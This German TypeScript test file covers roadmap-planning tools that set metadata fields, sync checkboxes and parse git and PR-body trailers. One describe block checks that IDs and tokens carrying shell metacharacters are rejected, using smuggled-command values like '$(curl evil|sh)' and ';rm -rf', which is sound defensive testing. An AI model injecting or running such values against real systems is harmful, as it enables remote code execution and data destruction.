// src/tests/plan-schreiben.test.ts — die SCHREIBENDEN Plan-Werkzeuge. Ein Werkzeug-Strang, eine Datei: scripts/plan/{set,buchung}.
// Zusammengelegt 31.8.2026 (QS-EFFIZIENZ, Ent-Regulierung Runde 2 Batch B; Beleg:
// bibliothek/betrieb/testapparat-fang-historie-2026-08-31.md §3 Kandidat 1). Die
// Fälle stehen WÖRTLICH unter dem Banner ihrer Herkunftsdatei; gestrichen wurde
// nur ein wörtliches Rumpf-Duplikat (ROADMAP-CHRONIK.md, 31.8.2026).
import {
  extractTrailerBlock,
  parseBuchung,
  parseBuchungAusPrBody,
  parseStatusTrailer,
} from '../../scripts/plan/buchung';
import { prosaMarkerDriftHinweis, setField } from '../../scripts/plan/set';

// ─── aus src/tests/plan-set.test.ts ────────────────────────────────────────────
// src/tests/plan-set.test.ts

const MD = `- [ ] **6 · Konsultieren**
  <!-- @meta id: W2·6 · status: ready · blocker: null · dep: [] · feld: betrieb -->
  Prosa.
`;

describe('setField', () => {
  it('setzt status=done und toggelt Checkbox auf [x]', () => {
    const out = setField(MD, 'W2·6', 'status', 'done');
    expect(out).toContain('status: done');
    expect(out).toContain('- [x] **6 · Konsultieren**');
  });

  it('setzt status=wip und toggelt Checkbox auf [~]', () => {
    const out = setField(MD, 'W2·6', 'status', 'wip');
    expect(out).toContain('status: wip');
    expect(out).toContain('- [~] **6 · Konsultieren**');
  });

  it('ändert ein Nicht-Status-Feld ohne Checkbox-Toggle', () => {
    const out = setField(MD, 'W2·6', 'blocker', 'wbqdyap3x');
    expect(out).toContain('blocker: wbqdyap3x');
    expect(out).toContain('- [ ] **6 · Konsultieren**');
  });

  it('wirft, wenn id nicht existiert', () => {
    expect(() => setField(MD, 'W9·9', 'status', 'done')).toThrow();
  });

  it('ändert ein Feld mit Mittelpunkt-Werten (dep mit W2·n-IDs)', () => {
    const md = [
      '- [ ] **6 · X**',
      '  <!-- @meta id: W2·6 · status: ready · blocker: null · dep: [W2·5] · feld: betrieb -->',
      '',
    ].join('\n');
    const out = setField(md, 'W2·6', 'dep', '[W2·5, W2·7]');
    expect(out).toContain('dep: [W2·5, W2·7]');
  });

  it('Wert mit $ wird literal eingesetzt (keine Backreference)', () => {
    const md = ['- [ ] **x**', '  <!-- @meta id: A · status: ready · blocker: null · dep: [] · feld: betrieb -->'].join('\n');
    const out = setField(md, 'A', 'dep', '[X$1Y]');
    expect(out).toContain('dep: [X$1Y]');
  });

  it('erhält den Blockquote-Präfix (> ) der @meta-Zeile', () => {
    const md = [
      '> **⬆ Prosa**',
      '> <!-- @meta id: QS-TOK · status: ready · blocker: null · dep: [] · feld: betrieb -->',
    ].join('\n');
    const out = setField(md, 'QS-TOK', 'status', 'wip');
    const metaZeile = out.split('\n').find((z) => z.includes('@meta'))!;
    expect(metaZeile.startsWith('> ')).toBe(true);
    expect(metaZeile).toContain('status: wip');
  });
});

// Fund 27 der QS-TOK-Endprüfung (31.7.2026): Der Checkbox-Nachzug prüfte
// `/^\s*-\s*\[[ x~]\]/` — `[d]`/`[D]` (Legenden-Status «geparkt/zurückgestellt»)
// fehlte in der Zeichenklasse. Folge: `plan:set <geparkter Schritt> status=ready`
// setzte das @meta, liess die Checkbox aber auf `[d]` stehen; check:plan (Glied von
// `npm run gate`) wurde dadurch beim Entparken rot — mit ZWEI Meldungen:
// «Checkbox [d] passt nicht zu status ready» und «status ready aber blocker gesetzt».
// Beide Meldungen müssen verschwinden, sonst ist nur die halbe Kette geheilt.
//
// Umfang richtiggestellt 31.7.2026 (Fund R2-10/R2-13 der Endprüfung Runde 2): Die
// frühere Fassung dieses Kommentars nannte «alle drei geparkten Schritte (W1·4,
// W2·5g-ZEIT, W2·5j-TABELLEN) sowie ROADMAP:494 `[D]`». Nachgezählt trägt die
// ROADMAP genau ZWEI `[d]/[D]`-Marken: die Bullet von `W2·5j-TABELLEN` und die
// Bullet `[D] **Quellen-Steinbruch OpenCaseLaw**`, die gar kein @meta trägt und
// für `plan:set` darum unerreichbar ist. W1·4 und W2·5g-ZEIT tragen `- [ ]`, waren
// also nie betroffen. Die Zeilenangabe «ROADMAP:494» war zudem schon beim Schreiben
// falsch (der Bullet stand auf 496) — Anker deshalb auf die stabile Form gehoben.
describe('setField — done räumt die @queue mit (§17-Wurzel-Fix 16.8.2026, PR #530)', () => {
  const MDQ = `<!-- @queue: W2·10, W2·6, W2·13 -->
- [~] **6 · Konsultieren**
  <!-- @meta id: W2·6 · status: wip · blocker: null · dep: [] · feld: betrieb -->
`;
  it('status=done entfernt genau die eigene ID aus der @queue', () => {
    const out = setField(MDQ, 'W2·6', 'status', 'done');
    expect(out).toContain('<!-- @queue: W2·10, W2·13 -->');
    expect(out).toContain('status: done');
  });
  it('status=wip lässt die @queue unangetastet', () => {
    const out = setField(MDQ.replace('status: wip', 'status: ready'), 'W2·6', 'status', 'wip');
    expect(out).toContain('<!-- @queue: W2·10, W2·6, W2·13 -->');
  });
  it('done ohne eigenen Queue-Eintrag lässt die @queue unangetastet', () => {
    const out = setField(MDQ.replace('W2·10, W2·6, W2·13', 'W2·10, W2·13'), 'W2·6', 'status', 'done');
    expect(out).toContain('<!-- @queue: W2·10, W2·13 -->');
  });
});

describe('setField — Entparken (Fund 27)', () => {
  const geparkt = (cb: string) => [
    `- ${cb} **5j-TABELLEN · X**`,
    '  <!-- @meta id: W2·5j · status: parked · blocker: david-spaeter-tabellen · dep: [] · feld: betrieb -->',
  ].join('\n');

  it('[d] → status=ready zieht die Checkbox auf [ ] nach', () => {
    const out = setField(geparkt('[d]'), 'W2·5j', 'status', 'ready');
    expect(out.split('\n')[0]).toBe('- [ ] **5j-TABELLEN · X**');
    expect(out).toContain('status: ready');
  });

  it('[D] (gross) → status=wip zieht die Checkbox auf [~] nach', () => {
    const out = setField(geparkt('[D]'), 'W2·5j', 'status', 'wip');
    expect(out.split('\n')[0]).toBe('- [~] **5j-TABELLEN · X**');
  });

  it('[d] → status=done zieht die Checkbox auf [x] nach', () => {
    const out = setField(geparkt('[d]'), 'W2·5j', 'status', 'done');
    expect(out.split('\n')[0]).toBe('- [x] **5j-TABELLEN · X**');
  });

  it('status=ready räumt den blocker mit ab (sonst bleibt check:plan rot)', () => {
    const out = setField(geparkt('[d]'), 'W2·5j', 'status', 'ready');
    expect(out).toContain('blocker: null');
    expect(out).not.toContain('david-spaeter-tabellen');
  });

  it('status=blocked lässt den blocker unangetastet', () => {
    const out = setField(geparkt('[d]'), 'W2·5j', 'status', 'blocked');
    expect(out).toContain('blocker: david-spaeter-tabellen');
  });

  // Fund R2-9/R2-15 (Runde 2): Der Fund-27-Fix nahm `d`/`D` in die Zeichenklasse
  // auf, ergänzte aber CHECKBOX_FUER nicht — für alles ausser done/wip griff der
  // Fallback `?? '[ ]'`. Damit überschrieb `plan:set <geparkt> status=parked` die
  // Legendenmarke `[d]` still mit `[ ]`, und kein Tor sah es: CHECKBOX_STATUS
  // erlaubt `[ ]` auch für parked/blocked. Der geparkte Schritt las sich danach
  // wie ein offener — genau die Marke, die das Ausführungs-Protokoll Ziff. 1 zum
  // Überspringen verlangt. `plan:set` konnte `[d]` zudem nie wieder erzeugen.
  it('parked → parked erhält die Legendenmarke [d]', () => {
    const out = setField(geparkt('[d]'), 'W2·5j', 'status', 'parked');
    expect(out.split('\n')[0]).toBe('- [d] **5j-TABELLEN · X**');
  });

  it('parked → blocked erhält die Legendenmarke [d]', () => {
    const out = setField(geparkt('[d]'), 'W2·5j', 'status', 'blocked');
    expect(out.split('\n')[0]).toBe('- [d] **5j-TABELLEN · X**');
  });

  it('[D] (gross) → parked bleibt als geparkt-Marke erhalten', () => {
    const out = setField(geparkt('[D]'), 'W2·5j', 'status', 'parked');
    expect(out.split('\n')[0]).toBe('- [D] **5j-TABELLEN · X**');
  });

  // Fund R3-2 (Endprüfung Runde 3, 31.7.2026) — fachliche Richtigstellung, kein
  // Refactoring (§6.3): Der R2-9/R2-15-Fix hatte `parked: '[d]'` und
  // `blocked: '[d]'` in `CHECKBOX_FUER` aufgenommen. Begründet war nur das
  // BEWAHREN einer vorhandenen `[d]`-Marke — das hängt aber an der
  // `CHECKBOX_STATUS`-Abfrage, nicht an `CHECKBOX_FUER`. Der Eintrag ERZEUGTE die
  // Legendenmarke darum auch neu: ein bloss blockierter Schritt wurde in der
  // menschenlesbaren Liste als «geparkt/zurückgestellt» beschriftet (§8), und
  // derselbe Status `blocked` erschien je nach Vorzustand als `[ ]` ODER `[d]`
  // (gemessen: `[~]`→blocked ⇒ `[d]`, `[ ]`→blocked ⇒ `[ ]`). Kein Tor sah es,
  // weil `CHECKBOX_STATUS['[d]']` beide Status duldet. Normalform ist `[ ]`.
  it('[~] + blocked ⇒ [ ] (Normalform, nicht die Legendenmarke)', () => {
    const out = setField(geparkt('[~]').replace('status: parked', 'status: wip'), 'W2·5j', 'status', 'blocked');
    expect(out.split('\n')[0]).toBe('- [ ] **5j-TABELLEN · X**');
  });

  it('[x] + blocked ⇒ [ ] (Normalform, nicht die Legendenmarke)', () => {
    const out = setField(geparkt('[x]').replace('status: parked', 'status: done'), 'W2·5j', 'status', 'blocked');
    expect(out.split('\n')[0]).toBe('- [ ] **5j-TABELLEN · X**');
  });

  // Gegenprobe zur Rücknahme: das BEWAHREN bleibt unangetastet — es hängt an der
  // CHECKBOX_STATUS-Abfrage, die `[d]`/`[D]` für parked und blocked duldet.
  //
  // GESTRICHEN 31.8.2026 (Ent-Regulierung Runde 2, Batch B): der zweite Fall
  // dieser Gegenprobe, «[d] + parked bleibt [d]», war mit dem Fall
  // «parked → parked erhält die Legendenmarke [d]» (oben, Fund R2-9/R2-15)
  // WÖRTLICH rumpfgleich — dieselbe Eingabe `geparkt('[d]')`/`parked`, dieselbe
  // Erwartung. Er war das einzige echte Duplikat unter 463 Steuerungs-Fällen.
  // Beide Vorfälle bleiben eingefroren: R2-9/R2-15 durch den Fall oben, die
  // R3-2-Gegenprobe durch den `[D]`-Fall hier.
  it('[D] + blocked bleibt [D] (Bewahrung unangetastet)', () => {
    const out = setField(geparkt('[D]'), 'W2·5j', 'status', 'blocked');
    expect(out.split('\n')[0]).toBe('- [D] **5j-TABELLEN · X**');
  });

  // Gegenprobe: passt die vorhandene Marke NICHT zum neuen Status, wird sie
  // nachgezogen — sonst wäre der Nachzug wirkungslos statt schonend. Ziel ist seit
  // R3-2 die Normalform `[ ]`, nicht mehr die Legendenmarke `[d]`: wer parken
  // WILL, setzt die Marke von Hand; `plan:set` erfindet sie nicht.
  it('[x] → parked wird auf die Normalform [ ] nachgezogen', () => {
    const out = setField(geparkt('[x]').replace('status: parked', 'status: done'), 'W2·5j', 'status', 'parked');
    expect(out.split('\n')[0]).toBe('- [ ] **5j-TABELLEN · X**');
  });
});

// ---------------------------------------------------------------------------
// Fund R2-1/R2-10 (Runde 2, KRITISCH): dieselbe Nachbarschafts-Annahme wie in
// parse.ts — der Checkbox-Nachzug brach an der ersten nicht-leeren Zeile über dem
// @meta ab. Steht dort Prosa, schreibt `plan:set` das @meta und lässt die
// sichtbare Checkbox stehen. Beide Layouts wörtlich aus der echten ROADMAP.
// ---------------------------------------------------------------------------
describe('setField — Checkbox-Nachzug über Prosa hinweg (Fund R2-1/R2-10)', () => {
  const B20 = [
    '  - [ ] **B20 · Prüf-Batch — «bereits gebaut» am Prod-Stand nachmessen (alle Bauteile)** — 15 Befunde (Blocker 1 · Hoch 5). §21.',
    '    **`dep: []` seit 31.7.2026 (Endprüfungs-Fund 18):** B20 ist kein Neubau, sondern Nachmessung,',
    '    und trägt mit LM-062 den einzigen Blocker der «bereits gebaut»-Klasse. Am Kettenende hätte die',
    '    Behauptung «ist gebaut» erst nach 19 Bau-Batches geprüft — erwiese sie sich als falsch, entstünde',
    '    der Bau-Posten am spätesten möglichen Punkt. B20 ist damit **unabhängig und vorziehbar**; die',
    '    Bau-Kette B1→…→B19 bleibt unverändert seriell. `plan:next` führt B20 dadurch gewollt in ready-now.',
    '    <!-- @meta id: W2·17-UI-BEFUNDE-B20 · status: ready · blocker: null · dep: [] · feld: betrieb -->',
  ].join('\n');

  const ZEIT = [
    '- [ ] **5g-ZEIT · Norm-Zeitmaschine + Fassungs-Diff** *(Ideen-Intake 20.7.2026 · Extraktion, `QS-GP`)*:',
    '  **Status 20.7.2026 (David):** «irgendwann, aktuell nicht relevant» → von `blocked` auf `parked`.',
    '  <!-- @meta id: W2·5g-ZEIT · status: parked · blocker: zeit-historik-poc · dep: [] · feld: betrieb -->',
  ].join('\n');

  it('B20-Layout: status=done zieht die Checkbox trotz 5 Prosa-Zeilen auf [x]', () => {
    const out = setField(B20, 'W2·17-UI-BEFUNDE-B20', 'status', 'done');
    expect(out.split('\n')[0].startsWith('  - [x] **B20 ·')).toBe(true);
  });

  it('W2·5g-ZEIT-Layout: status=wip zieht die Checkbox trotz Prosa-Zeile auf [~]', () => {
    const out = setField(ZEIT, 'W2·5g-ZEIT', 'status', 'wip');
    expect(out.split('\n')[0].startsWith('- [~] **5g-ZEIT ·')).toBe(true);
  });

  it('bindet NICHT an eine fremde Bullet-Zeile darüber', () => {
    const md = [
      '  - [ ] **fremde Checkbox der Nachbarliste**',
      '- **Datenhaltung / Single-Source-DB** *(QS-DATA)*.',
      '  <!-- @meta id: QS-DATA · status: blocked · blocker: b1 · dep: [] · feld: betrieb -->',
    ].join('\n');
    const out = setField(md, 'QS-DATA', 'status', 'done');
    expect(out.split('\n')[0]).toBe('  - [ ] **fremde Checkbox der Nachbarliste**');
  });
});

// ---------------------------------------------------------------------------
// QS-PLAN-EINFACH (14.8.2026): `seq-hart`/`seq-weich` sind gestrichen — Alt-
// Zeilen im Bestand dürfen plan:set aber nicht brechen; der nächste Schreib-
// zugriff räumt die Felder mechanisch ab.
// ---------------------------------------------------------------------------
describe('setField — optionale Felder und Altfeld-Toleranz', () => {
  it('räumt gestrichene Altfelder (seq-hart/seq-weich) beim Schreiben ab', () => {
    const alt =
      '  <!-- @meta id: W2·5d · status: ready · blocker: null · dep: [] · feld: betrieb -->';
    const md = ['- [ ] **5d · Gesetzes-UX**', alt].join('\n');
    const out = setField(md, 'W2·5d', 'status', 'wip');
    const zeile = out.split('\n').find((z) => z.includes('@meta'))!;
    expect(zeile).toContain('status: wip');
    expect(zeile).not.toContain('seq-hart');
    expect(zeile).not.toContain('seq-weich');
  });

  // Beim Nachtragen der `fahrplan:`-Felder für W3·10/W3·11/W3·14-S/W3·14-a11y
  // aufgefallen (31.7.2026): `setField` ersetzte das Feld per Regex in der
  // normalisierten Zeile. Fehlte das OPTIONALE Feld dort, traf die Regex nichts —
  // die Zeile blieb unverändert, und die CLI meldete trotzdem «gesetzt: …».
  // Dieselbe Fehlerklasse wie die Funde dieser Runde: ein Werkzeug, das seinen
  // Nicht-Erfolg als Erfolg meldet. Optionale Felder werden jetzt angehängt;
  // parseEtikett liest reihenfolge-unabhängig, serializeEtikett normalisiert.
  it('trägt ein fehlendes optionales Feld nach, statt still nichts zu tun', () => {
    const md = [
      '- [ ] **10 · X**',
      '  <!-- @meta id: W3·10 · status: ready · blocker: null · dep: [] · feld: betrieb -->',
    ].join('\n');
    const out = setField(md, 'W3·10', 'fahrplan', 'fahrplaene/FAHRPLAN-X.md');
    expect(out).not.toBe(md);
    expect(out.split('\n')[1]).toBe(
      '  <!-- @meta id: W3·10 · status: ready · blocker: null · dep: [] · feld: betrieb · fahrplan: fahrplaene/FAHRPLAN-X.md -->');
  });

  it('gestrichene Felder sind nicht mehr setzbar', () => {
    const md = [
      '- [ ] **10 · X**',
      '  <!-- @meta id: W3·10 · status: ready · blocker: null · dep: [] · feld: betrieb -->',
    ].join('\n');
    expect(() => setField(md, 'W3·10', 'seq-hart', '[QS-PERF(a.ts)]')).toThrow(/Unbekanntes Feld/);
    expect(() => setField(md, 'W3·10', 'of', 'ja')).toThrow(/Unbekanntes Feld/);
  });
});

// ---------------------------------------------------------------------------
// §17-Wurzel-Fix (Anlass 5.8.2026): `npm run plan:set -- QS-TOK status=wip`
// setzte den Queue-Kopf auf `wip`, liess den Prosa-Marker «⬆ OBERSTER OFFENER
// SCHRITT» unverändert — der wip-Schritt fällt aus `resolve().readyNow`
// (aufloesen.ts), also driftete der Marker sofort gegen `plan:next`, und
// check:plan Regel 8.4 wurde erst im NÄCHSTEN Lauf rot (check.ts). Die neue
// Beobachtungsfunktion `prosaMarkerDriftHinweis` prüft dieselbe Lage sofort
// nach dem Setzen, ohne die Prosa selbst anzufassen.
// ---------------------------------------------------------------------------
describe('prosaMarkerDriftHinweis (§17-Wurzel-Fix)', () => {
  const mitQueue = (queueIds: string, marker: string) =>
    [
      `<!-- @queue: ${queueIds} -->`,
      marker,
      '- [ ] **4 · D**',
      '  <!-- @meta id: W1·4 · status: ready · blocker: null · dep: [] · feld: betrieb -->',
      '- [ ] **5 · E**',
      '  <!-- @meta id: W1·5 · status: ready · blocker: null · dep: [] · feld: betrieb -->',
    ].join('\n');

  it('Marker nennt X, X wird wip → Hinweis enthält beide IDs', () => {
    const md = mitQueue('W1·4, W1·5', '> **⬆ OBERSTER OFFENER SCHRITT:** `W1·4` zuerst.');
    const out = setField(md, 'W1·4', 'status', 'wip');
    const hinweis = prosaMarkerDriftHinweis(out);
    expect(hinweis).not.toBeNull();
    expect(hinweis).toContain('`W1·4`');
    expect(hinweis).toContain('`W1·5`');
    expect(hinweis).toContain('Regel 8.4');
  });

  it('Marker stimmt weiterhin mit plan:next überein → kein Hinweis', () => {
    const md = mitQueue('W1·4, W1·5', '> **⬆ OBERSTER OFFENER SCHRITT:** `W1·4` zuerst.');
    const out = setField(md, 'W1·5', 'blocker', 'irrelevant-fuer-marker');
    expect(prosaMarkerDriftHinweis(out)).toBeNull();
  });

  it('kein Marker vorhanden → kein Hinweis', () => {
    const md = mitQueue('W1·4, W1·5', '');
    const out = setField(md, 'W1·4', 'status', 'wip');
    expect(prosaMarkerDriftHinweis(out)).toBeNull();
  });
});


// ─── aus src/tests/plan-buchung.test.ts ────────────────────────────────────────
// src/tests/plan-buchung.test.ts

describe('parseStatusTrailer', () => {
  it('parst "done" ohne Blocker', () => {
    expect(parseStatusTrailer('done')).toEqual({ status: 'done', blocker: null });
  });

  it('parst "ready" ohne Blocker', () => {
    expect(parseStatusTrailer('ready')).toEqual({ status: 'ready', blocker: null });
  });

  it('parst "parked(<token>)" mit Blocker-Token', () => {
    expect(parseStatusTrailer('parked(a33-flake)')).toEqual({ status: 'parked', blocker: 'a33-flake' });
  });

  it('trimmt umgebende Leerzeichen (git-Trailer-Wert)', () => {
    expect(parseStatusTrailer('  ready  ')).toEqual({ status: 'ready', blocker: null });
  });

  // §6.7-Rot-Fall: ungültiger Status wirft.
  it('wirft bei unbekanntem Status', () => {
    expect(() => parseStatusTrailer('erledigt')).toThrow(/ungültiger Wert "erledigt"/);
  });

  it('wirft bei wip/blocked (kein Merge-Trailer-Ergebnis)', () => {
    expect(() => parseStatusTrailer('wip')).toThrow(/ungültiger Wert "wip"/);
    expect(() => parseStatusTrailer('blocked')).toThrow(/ungültiger Wert "blocked"/);
  });

  it('wirft bei "parked" ohne Blocker-Token', () => {
    expect(() => parseStatusTrailer('parked')).toThrow(/verlangt ein Blocker-Token/);
    expect(() => parseStatusTrailer('parked()')).toThrow(/verlangt ein Blocker-Token/);
  });

  it('wirft bei Klammer-Zusatz ausserhalb von "parked"', () => {
    expect(() => parseStatusTrailer('done(x)')).toThrow(/nur bei "parked" erlaubt/);
  });

  it('wirft bei unlesbarem Wert', () => {
    expect(() => parseStatusTrailer('!!!')).toThrow(/unlesbar/);
  });
});

describe('parseBuchung', () => {
  it('kombiniert Roadmap- und Roadmap-Status-Trailer zu einer Buchung', () => {
    expect(parseBuchung('QS-PLAN-EINFACH', 'done')).toEqual({
      id: 'QS-PLAN-EINFACH',
      status: 'done',
      blocker: null,
    });
  });

  it('trägt den Blocker bei "parked" mit', () => {
    expect(parseBuchung('QS-CURRENCY-KANON', 'parked(warten-auf-david)')).toEqual({
      id: 'QS-CURRENCY-KANON',
      status: 'parked',
      blocker: 'warten-auf-david',
    });
  });

  it('wirft bei leerem ID-Trailer', () => {
    expect(() => parseBuchung('', 'done')).toThrow(/Trailer ist leer/);
    expect(() => parseBuchung('   ', 'done')).toThrow(/Trailer ist leer/);
  });

  it('wirft bei ungültigem Status-Trailer (Rot-Fall über die kombinierte Funktion)', () => {
    expect(() => parseBuchung('QS-PLAN-EINFACH', 'fertig')).toThrow(/ungültiger Wert "fertig"/);
  });
});

// Gegenprüfungs-Befund 14.8.2026 (Shell-Injection): ID/Token mit Metazeichen
// werden hart abgewiesen — §6.7-Rotfall der Zeichensatz-Wache.
describe('parseBuchung — Zeichensatz-Wache (Injection)', () => {
  it('wirft bei Metazeichen in der ID', () => {
    expect(() => parseBuchung('$(curl evil|sh)', 'done')).toThrow(/unerlaubte Zeichen/);
    expect(() => parseBuchung('W2·10;rm -rf', 'done')).toThrow(/unerlaubte Zeichen/);
  });
  it('wirft bei Metazeichen im Blocker-Token', () => {
    expect(() => parseBuchung('QS-DATA', 'parked($(id))')).toThrow(/unerlaubte Zeichen/);
  });
  it('lässt echte IDs und Tokens durch', () => {
    expect(parseBuchung('W2·10-UI-NAV', 'done')).toEqual({ id: 'W2·10-UI-NAV', status: 'done', blocker: null });
    expect(parseBuchung('QS-DATA', 'parked(vps-bestellung-david)')).toEqual({ id: 'QS-DATA', status: 'parked', blocker: 'vps-bestellung-david' });
  });
});

// Fallback (Lehre 14.8.2026, real bei PR #491): fehlt der Trailer im
// Squash-Commit (GitHub-Standard-Squash-Text bei mehreren Commits), wird die
// Buchungs-Absicht ersatzweise aus dem PR-Body gelesen.
describe('extractTrailerBlock', () => {
  it('liest den letzten Absatz als Trailer-Block, wenn jede Zeile "Key: value" ist', () => {
    const body = 'Beschreibung des PRs.\n\nMehr Fliesstext hier.\n\nRoadmap: QS-EFFIZIENZ\nRoadmap-Status: done';
    expect(extractTrailerBlock(body)).toEqual({ Roadmap: 'QS-EFFIZIENZ', 'Roadmap-Status': 'done' });
  });

  it('gibt ein leeres Objekt zurück, wenn der letzte Absatz gewöhnlicher Fliesstext ist', () => {
    const body = 'Roadmap: QS-EFFIZIENZ\nRoadmap-Status: done\n\nNoch ein Nachsatz ohne Trailer-Form.';
    expect(extractTrailerBlock(body)).toEqual({});
  });

  it('gibt ein leeres Objekt bei leerem Text zurück', () => {
    expect(extractTrailerBlock('')).toEqual({});
    expect(extractTrailerBlock('   ')).toEqual({});
  });

  it('mehrfacher Key: der letzte gewinnt (wie git interpret-trailers)', () => {
    const body = 'Roadmap: ALT\nRoadmap: NEU\nRoadmap-Status: ready';
    expect(extractTrailerBlock(body)).toEqual({ Roadmap: 'NEU', 'Roadmap-Status': 'ready' });
  });

  // Gegenprüfungs-Auflage B1-1 (14.8.2026): Haus-PR-Bodies enden auf den
  // Werkzeug-Footer — ohne Footer-Skip hätte der Anlass-PR #491 NIE gebucht.
  describe('Footer-Skip (B1-1)', () => {
    it('bucht aus einem REALEN Haus-Body: Trailer-Absatz gefolgt vom 🤖-Footer-Absatz', () => {
      const body =
        '## Inhalt\n\n' +
        'Vier Punkte umgesetzt, siehe Details oben.\n\n' +
        'Roadmap: QS-EFFIZIENZ\nRoadmap-Status: done\n\n' +
        '🤖 Generated with [Claude Code](https://claude.com/claude-code)';
      expect(extractTrailerBlock(body)).toEqual({ Roadmap: 'QS-EFFIZIENZ', 'Roadmap-Status': 'done' });
    });

    it('überspringt eine "---"-Trennlinie VOR dem Footer ebenfalls', () => {
      const body =
        'Text.\n\nRoadmap: QS-EFFIZIENZ\nRoadmap-Status: ready\n\n---\n\n' +
        '🤖 Generated with [Claude Code](https://claude.com/claude-code)';
      expect(extractTrailerBlock(body)).toEqual({ Roadmap: 'QS-EFFIZIENZ', 'Roadmap-Status': 'ready' });
    });

    it('Footer-only-Body (keine Buchungs-Absicht irgendwo) -> still, leeres Objekt', () => {
      const body = 'Beschreibung ohne jede Trailer-Absicht.\n\n🤖 Generated with [Claude Code](https://claude.com/claude-code)';
      expect(extractTrailerBlock(body)).toEqual({});
      expect(extractTrailerBlock('🤖 Generated with [Claude Code](https://claude.com/claude-code)')).toEqual({});
    });

    it('Absatz direkt vor dem Footer ist kein vollständiger Trailer-Block -> kein Treffer (kein Weitersuchen)', () => {
      const body =
        'Roadmap: QS-EFFIZIENZ\nRoadmap-Status: done\n\n' + // echter Trailer weiter vorn — zählt NICHT
        'Ein Nachsatz, der die Absicht nur erwähnt.\n\n' +
        '🤖 Generated with [Claude Code](https://claude.com/claude-code)';
      expect(extractTrailerBlock(body)).toEqual({});
    });
  });

  // Gegenprüfungs-Auflage B1-3 (14.8.2026): eingerückte Zeilen und Zeilen in
  // ``` -Fences zählen nie als Trailer-Zeilen.
  describe('Einrückung und Codeblöcke zählen nie als Trailer (B1-3)', () => {
    it('Sonden-Body mit 4-Leerzeichen-Einrückung bucht NICHT', () => {
      const body = 'Beispiel-Doku:\n\n    Roadmap: X\n    Roadmap-Status: done';
      expect(extractTrailerBlock(body)).toEqual({});
    });

    it('Trailer-Zeilen innerhalb eines ``` -Fences zählen nicht', () => {
      const body = 'Beispiel:\n\n```\nRoadmap: X\nRoadmap-Status: done\n```';
      expect(extractTrailerBlock(body)).toEqual({});
    });

    it('unindentierter echter Trailer-Block danach bucht weiterhin', () => {
      const body = '```\nBeispiel-Code\n```\n\nRoadmap: QS-EFFIZIENZ\nRoadmap-Status: done';
      expect(extractTrailerBlock(body)).toEqual({ Roadmap: 'QS-EFFIZIENZ', 'Roadmap-Status': 'done' });
    });
  });

  it('unbekannte Keys (nicht Roadmap/Roadmap-Status/Gegenpruefung) machen den Absatz ungültig', () => {
    const body = 'Text.\n\nRoadmap: QS-EFFIZIENZ\nRoadmap-Status: done\nSonstwas: X';
    expect(extractTrailerBlock(body)).toEqual({});
  });

  it('akzeptiert den dritten Haus-Key "Gegenpruefung" im selben Block', () => {
    const body = 'Text.\n\nRoadmap: W2·12-HYGIENE\nRoadmap-Status: done\nGegenpruefung: bestanden';
    expect(extractTrailerBlock(body)).toEqual({
      Roadmap: 'W2·12-HYGIENE',
      'Roadmap-Status': 'done',
      Gegenpruefung: 'bestanden',
    });
  });
});

describe('parseBuchungAusPrBody', () => {
  // (a) Fallback greift bei Standard-Squash-Text mit PR-Body-Trailer.
  it('bucht aus dem PR-Body, wenn der Commit-Trailer fehlt (Standard-Squash-Text)', () => {
    const body =
      '## Zusammenfassung\n\nDieser PR erledigt QS-EFFIZIENZ Punkt 3.\n\n' +
      'Roadmap: QS-EFFIZIENZ\nRoadmap-Status: done';
    expect(parseBuchungAusPrBody(body)).toEqual({ id: 'QS-EFFIZIENZ', status: 'done', blocker: null });
  });

  it('bucht "parked(<token>)" mit Blocker aus dem PR-Body', () => {
    const body = 'Text.\n\nRoadmap: QS-CURRENCY-KANON\nRoadmap-Status: parked(warten-auf-david)';
    expect(parseBuchungAusPrBody(body)).toEqual({
      id: 'QS-CURRENCY-KANON',
      status: 'parked',
      blocker: 'warten-auf-david',
    });
  });

  // (c) kein Trailer nirgends -> still (null, kein Wurf).
  it('gibt null zurück, wenn der PR-Body gar keine Buchungs-Absicht trägt', () => {
    expect(parseBuchungAusPrBody('Nur eine gewöhnliche PR-Beschreibung ohne Trailer.')).toBeNull();
    expect(parseBuchungAusPrBody('')).toBeNull();
  });

  // VERHALTENSÄNDERUNG 3.9.2026 (deklariert, §6.3; Beleg: Workflow-Lauf
  // 33694227189 bei PR #636 rot): «lone Roadmap = noop». Ein PR-Body mit NUR
  // `Roadmap:` (keine `Roadmap-Status:`-Zeile irgendwo im Body) ist seither
  // KEIN Fehler mehr, sondern der gültige Normalzustand für einen Schritt,
  // der nach der Landung bewusst `wip` bleibt (Skill landung Ziff. 9) — bis
  // 3.9.2026 warf dieselbe Eingabe noch (siehe Historie unten).
  it('gibt null zurück (kein Fehler), wenn im ganzen Body keine Roadmap-Status-Zeile vorkommt', () => {
    // (iii) nur `Roadmap:` -> kein Fehler, vorhanden=false.
    expect(parseBuchungAusPrBody('Text.\n\nRoadmap: QS-EFFIZIENZ')).toBeNull();
  });

  // Nachprüfungs-Befund Opus 3.9.2026: ein wip-Body, der die Trailer-FORM nur
  // ZITIERT (```-Fence oder eingerückter Codeblock — genau das Beispiel aus
  // Skill landung Ziff. 9), trägt keine Buchungsabsicht. Zählte das Zitat, käme
  // der #636-Rotlauf für jeden Body zurück, der die Regel erklärt.
  it('ignoriert eine Roadmap-Status-Zeile, die nur in einem Codeblock zitiert wird', () => {
    const fence = 'Regel:\n\n```\nRoadmap: <ID>\nRoadmap-Status: done|ready\n```\n\nRoadmap: QS-EFFIZIENZ';
    expect(parseBuchungAusPrBody(fence)).toBeNull();
    const eingerueckt = 'Regel:\n\n    Roadmap-Status: done\n\nRoadmap: QS-EFFIZIENZ';
    expect(parseBuchungAusPrBody(eingerueckt)).toBeNull();
    // Gegenprobe: dieselbe Zeile AUSSERHALB des Fences zählt weiterhin => Wurf.
    const echt = 'Regel:\n\n```\nRoadmap: <ID>\n```\n\nRoadmap-Status: done\n\nRoadmap: QS-EFFIZIENZ';
    expect(() => parseBuchungAusPrBody(echt)).toThrow(/unvollständiger Buchungs-Block/);
  });

  // FACHLICHE ÄNDERUNG 15.8.2026 (deklariert, §6.3): ein ECHTER halber
  // Buchungs-Block verpuffte bis dahin still — Realfall PR #507: `Roadmap:`
  // und `Roadmap-Status:` durch Leerzeile getrennt, nur der letzte Absatz
  // zählte als Block, Workflow endete «success» ohne Push, Hand-Buchung
  // nötig. Seither gilt: erkennbare, aber unvollständige Buchungs-Absicht
